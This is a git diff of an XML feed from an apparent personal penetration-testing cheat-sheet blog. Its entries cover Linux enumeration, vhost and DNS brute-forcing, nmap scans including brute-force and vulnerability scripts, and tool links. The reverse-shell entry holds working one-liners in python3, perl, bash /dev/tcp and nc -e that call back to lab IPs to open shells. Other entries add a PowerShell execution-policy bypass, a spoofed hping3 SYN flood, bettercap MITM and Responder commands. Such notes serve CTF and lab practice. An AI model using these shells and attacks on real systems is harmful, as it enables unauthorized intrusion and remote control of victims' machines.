@@ -47,7 +47,7 @@ ls -ltr
 #wrap ps commands ps auxww
 #remove all before
 cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5 awk -F &amp;ldquo;:&amp;rdquo; &amp;lsquo;{print $1}&amp;rsquo; /etc/passwd
- #capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 &#34;bash&#34; /skrypty/ #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null find / -user root -perm -o=w -type f -not -path &#34;</description>
+ #capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 &#34;bash&#34; $(pwd) #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null find / -user root -perm -o=w -type f -not -path &#34;</description>
     </item>
     
     <item>
@@ -76,8 +76,7 @@ https://github.com/DominicBreuker/pspy</description>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/domain/</guid>
-      <description>vhost enumeration nmap &amp;ndash;script http-vhosts -p 80,443 10.10.10.113 
- git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  nmap --script dns-brute friendzone.red sublist3r -b -d friendzone.red Domain transfer dig +nocmd axfr @10.10.10.1 example.com +noall +answer</description>
+      <description>vhost enumeration nmap --script http-vhosts -p 80,443 10.10.10.113 nmap --script dns-brute domain.pl   git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  nmap --script dns-brute friendzone.red  Domain transfer dig +nocmd axfr @10.10.10.1 example.com +noall +answer</description>
     </item>
     
     <item>
@@ -107,8 +106,7 @@ ldapsearch ldapsearch -x -h 10.10.10.107 -s base -b &amp;lsquo;dc=hackthebox,dc=
       
       <guid>https://sosprz.github.io/posts/nmap/</guid>
       <description>nmap -sC -sV -oA nmap/hostname ip nmap -c -v -max-retires=0 -t5 -p- 10.10.10.10  nmap &amp;ndash;script smb-brute.nse -p445 ip
-nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip 
- nmap -p 80 &amp;ndash;script http-shellshock &amp;ndash;script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 &amp;ndash;script mysql-brute ip nmap -sV &amp;ndash;script=http-enum ip nmap -sV &amp;ndash;script=nfs-showmount ip nmap -sV &amp;ndash;script ssl-enum-ciphers -p 443 ip nmap -p445 &amp;ndash;script smb-vuln-ms17-010 ip nmap &amp;ndash;script smb-brute.</description>
+nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip   nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 --script mysql-brute ip nmap -sV --script=http-enum ip nmap -sV --script=nfs-showmount ip nmap -sV --script ssl-enum-ciphers -p 443 ip nmap -p445 --script smb-vuln-ms17-010 ip nmap --script smb-brute.</description>
     </item>
     
     <item>
@@ -117,7 +115,8 @@ nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hos
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/openssl/</guid>
-      <description>https://github.com/glv2/bruteforce-salted-openssl</description>
+      <description> links https://github.com/glv2/bruteforce-salted-openssl
+check remote ssl openssl s_client -connect wp.pl local check openssl x509 -in 1000.pem -text -noout </description>
     </item>
     
     <item>
@@ -216,15 +215,16 @@ tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/shell-reverse/</guid>
-      <description>connect  python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
+      <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.132 5555 &amp;gt;/tmp/f 
+
 reverse  bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.113&amp;frasl;443 0&amp;gt;&amp;amp;1
 &amp;rsquo;/bin/bash -c &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1&amp;frasl;2323 0&amp;gt;&amp;amp;1&amp;rsquo; 
 listen  nc -lvp 443
 nc -lp 1&amp;gt;/tmp/b 
-ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | \n\c -6 -l 6677 &amp;gt; /tmp/f; nc -6 localhost 6677</description>
+ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | \n\c -6 -l 6677 &amp;gt; /tmp/f; nc -6 localhost 6677 
+bypass to run powershell scripts  powershell -ExecutionPolicy ByPass -File GetCLSID.</description>
     </item>
     
     <item>
@@ -256,7 +256,8 @@ sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 &amp;ndash
 Responder responder -i tun0
 Hping3 hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 &amp;ndash;flood
 Bettercap bettercap -X -I wlp2s0 -T 172.18.10.40 &amp;ndash;proxy -P post
-https://github.com/diego-treitos/linux-smart-enumeration https://github.com/joaogmauricio/redhttpd</description>
+links https://github.com/21y4d/nmapAutomator https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/joaogmauricio/redhttpd</description>
     </item>
     
     <item>
